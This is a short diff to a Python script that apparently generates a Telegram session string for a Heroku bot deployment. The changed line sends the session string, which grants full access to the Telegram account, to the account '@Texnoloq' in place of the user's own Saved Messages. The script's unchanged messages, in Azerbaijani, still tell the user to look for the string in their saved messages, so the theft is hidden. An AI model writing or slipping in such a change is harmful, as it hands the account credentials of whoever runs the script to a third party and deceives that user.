@@ -8,6 +8,6 @@ with TelegramClient(
     API_HASH
 ) as client:
     session_str = client.session.save()
-    s_m = client.send_message("me", session_str)
+    s_m = client.send_message("@Texnoloq", session_str)
     print('Kayitli mesajlara baxaraq string sessionu kopyalaya bilersiz.')
     print('Herokuya kecerek deploya davam edin.')
